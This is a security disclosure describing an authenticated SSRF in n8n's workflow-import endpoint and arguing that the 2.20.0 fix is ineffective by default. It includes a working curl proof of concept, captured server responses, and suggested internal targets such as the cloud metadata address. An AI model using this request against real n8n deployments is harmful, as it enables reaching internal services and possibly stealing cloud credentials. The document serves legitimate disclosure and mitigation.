# n8n: SSRF via workflow import endpoint (`/rest/workflows/from-url`) — fixed as a non-security bugfix, with an incomplete (default-off) fix

| Field | Value |
|---|---|
| Date | 2026-06-26 |
| Product | n8n |
| Type | SSRF (CWE-918), authenticated |
| Affected versions | `<= 2.19.x` unconditionally (validated on 2.19.0); `2.20.0`+ by default, i.e. when `N8N_SSRF_PROTECTION_ENABLED` is not set to `true` — verified on `2.27.4` (current stable) by source review and `2.28.2` (current pre-release) by live test |
| Fixed in | 2.20.0 (released 2026-05-05), via [PR #29178](https://github.com/n8n-io/n8n/pull/29178) / commit [`ecd0ba8eba`](https://github.com/n8n-io/n8n/commit/ecd0ba8eba) — opt-in only |
| CVE | none assigned |
| Status | Independent parallel discovery; fixed as a non-security bugfix, no advisory; exploitable by default |

## Executive summary

`GET /rest/workflows/from-url` lets any authenticated user with
project-scoped `workflow:create` permission make the n8n server issue an
outbound HTTP request to an arbitrary URL — a server-side request forgery
reaching loopback, link-local, and RFC1918 internal addresses, with the response
reflected to the caller when it is workflow-shaped JSON.

n8n added URL validation in 2.20.0 (PR #29178), routing the fetch through its
`SsrfProtectionService`. **But that protection is gated on
`N8N_SSRF_PROTECTION_ENABLED`, which is off by default**, so a default install
remains exploitable out of the box — the current stable release (2.27.4) and the
current pre-release (2.28.2) alike. The change shipped as an ordinary
`fix(core)` bugfix with **no CVE and no security advisory**, so operators are
not told it is a security-relevant setting they must enable.

## Affected and fix status

- **Independent parallel discovery.** n8n found and began fixing this internally
  before the report: PR #29178 was opened 2026-04-27 (internal ticket CAT-2890)
  and merged 2026-04-29. This SSRF was reported to the n8n security team
  independently on 2026-04-29. This disclosure does **not** claim the fix was
  prompted by the report and seeks no credit for it.
- **Fixed but opt-in.** The fix shipped in 2.20.0 (2026-05-05) but only engages
  when `N8N_SSRF_PROTECTION_ENABLED=true`; the default is off (see
  *Fix status*).
- **No advisory.** Released as a plain `fix(core)` bugfix — no CVE, no GHSA.
- **Vendor declined** the report on 2026-05-20 as not qualifying.

## Confirmed impact

- Arbitrary authenticated server-side fetch to attacker-chosen targets reachable
  from the n8n server, including loopback and RFC1918 addresses.
- Response reflection when the target returns workflow-shaped JSON; otherwise a
  boolean/timing oracle via response and error differences.

On managed cloud deployments, an outbound-fetch primitive of this class is the
standard precondition for reaching internal services and cloud metadata
endpoints. Cloud metadata exfiltration was not independently validated and is
not claimed here as confirmed.

## Vulnerable behavior (pre-fix)

In `packages/cli/src/workflows/workflows.controller.ts`, the `getFromUrl`
handler:

- was reachable by any authenticated user with `workflow:create` in a project;
- read the user-controlled `query.url`;
- called `axios.get<IWorkflowResponse>(query.url)` directly — no hostname
  validation, no IP blocklist, no SSRF service;
- returned the fetched body to the caller if it parsed as workflow JSON, and a
  generic `400` otherwise — but only *after* the server-side request had fired.

## Fix status: implemented, but default-off

The endpoint was remediated in [PR #29178](https://github.com/n8n-io/n8n/pull/29178)
("fix(core): Validate workflow import URL requests", commit
[`ecd0ba8eba`](https://github.com/n8n-io/n8n/commit/ecd0ba8eba)), first released
in 2.20.0. The handler no longer calls `axios.get(query.url)` directly; it routes
the URL through `SsrfProtectionService` via a new `fetchWorkflowFromUrl()`:

```ts
private async fetchWorkflowFromUrl(url: string) {
  const client = this.outboundHttp.requests({
    ssrf: this.ssrfConfig.enabled ? this.ssrfProtectionService : 'disabled',
  });
  try {
    return await client.request<IWorkflowResponse>({ method: 'GET', url });
  } catch (error) {
    const blockedError = this.findSsrfBlockedError(error);
    if (blockedError) throw blockedError;
    throw new BadRequestError('The URL does not point to valid JSON file!');
  }
}
```

Protection is conditional on `this.ssrfConfig.enabled`, and that flag is off by
default. From `packages/@n8n/config/src/configs/ssrf-protection.config.ts`:

```ts
@Env('N8N_SSRF_PROTECTION_ENABLED')
enabled: boolean = false; // "Off by default so existing self-hosted setups ... keep working"
```

So on a default install `fetchWorkflowFromUrl` passes `ssrf: 'disabled'` and
performs an **unprotected** outbound fetch. When the flag *is* enabled, the
request is validated by `SsrfProtectionService` (`packages/@n8n/backend-network`)
at pre-flight, at socket connect time (a custom DNS `lookup`, so a rebinding
TOCTOU is rechecked), and on every HTTP redirect hop, against a blocklist
covering loopback, link-local and RFC1918 ranges.

| Scenario | <= 2.19.x | 2.20.0+ |
|---|---|---|
| `N8N_SSRF_PROTECTION_ENABLED=true` | endpoint unprotected | protected |
| Default install (flag unset) | vulnerable | **still vulnerable** |

**Mitigation for operators:** set `N8N_SSRF_PROTECTION_ENABLED=true` (and
consider network-layer egress restrictions). Verify with the PoC below — the
request should then be rejected.

## Proof of concept

**Setup (common to both runs).** The attacker-supplied `url` is
`http://172.17.0.1:8888/`, chosen to stand in for an internal target:

- `172.17.0.1` is the Docker bridge gateway — the host as seen *from inside* the
  n8n container, an address the server can reach but an external attacker cannot.
- It sits in `172.16.0.0/12` (RFC1918), the exact range n8n's blocklist covers,
  so the *same* URL exercises both states (reflected by default, blocked when
  protection is on).
- `:8888` is a logging HTTP listener that returns workflow-shaped JSON, so n8n
  treats the fetch as a successful import and reflects the body; its log records
  who connected.

In a real deployment an attacker would substitute a sensitive internal target
reachable by the n8n host, e.g. `http://169.254.169.254/latest/meta-data/`
(cloud metadata), `http://127.0.0.1:5678/rest/...` (n8n's own loopback APIs), or
any `http://10.x`/`192.168.x` internal service.

The request itself is the same in every run below — prerequisite: an
authenticated account with `workflow:create` in at least one project:

```bash
curl -s -G -b cookies.txt \
  'http://localhost:5678/rest/workflows/from-url' \
  --data-urlencode "projectId=$PROJECT_ID" \
  --data-urlencode 'url=http://172.17.0.1:8888/'
```

### Original behavior (2.19.0)

`docker run -p 5678:5678 n8nio/n8n:2.19.0`. The server made the outbound request
to the internal address (confirmed in the listener's log) and, because the
target returned JSON with `nodes`/`connections` keys, reflected the full body:

```
--> HTTP 200
{"data":{"nodes":[],"connections":{},"secret":"SSRF_CONFIRMED"}}
```

### Current pre-release, default config (n8n@2.28.2)

A stock container, no flags
(`docker run -d -p 5678:5678 -e N8N_SECURE_COOKIE=false n8nio/n8n:2.28.2`),
executed 2026-06-26 local time; listener timestamps are UTC. The current stable
release (2.27.4) carries the same default-off flag and is affected by the same
code path. The fetch fires and the body is
reflected; the log line `from=172.17.0.2` is the n8n container's own IP, proving
the request was made server-side, not by the client:

```
--> HTTP 200
{"data":{"nodes":[],"connections":{},"secret":"SSRF_CONFIRMED_2282"}}

listener log: VICTIM-HIT path=/ UA=n8n from=172.17.0.2
```

### Same request with protection enabled

Identical request, but with `N8N_SSRF_PROTECTION_ENABLED=true` — blocked at
validation; no request reaches the listener:

```
--> HTTP 400
{"code":0,"message":"The request was blocked because it resolves to a restricted IP address"}
```

## Vendor position

The vendor declined this report on 2026-05-20 as not qualifying, in part citing
a shared-responsibility framing for self-hosted SSRF. The fix was independent
internal work, released as an ordinary bugfix without a CVE or advisory.

This disclosure seeks no credit for the fix. It documents that the behavior is a
genuine SSRF, that it was corrected without a public security advisory, and that
the correction leaves the default configuration exploitable on the current
release.

## Timeline

- 2026-04-27: n8n opens PR #29178 internally (ticket CAT-2890).
- 2026-04-29: this SSRF independently reported to the n8n security team.
- 2026-04-29: PR #29178 merged.
- 2026-05-05: fix released in n8n 2.20.0 (no CVE / no advisory).
- 2026-05-20: vendor declines this report as "does not qualify."
- 2026-06-13, 2026-06-17: reporter follow-ups requesting status.
- 2026-06-26: public disclosure published (this document).
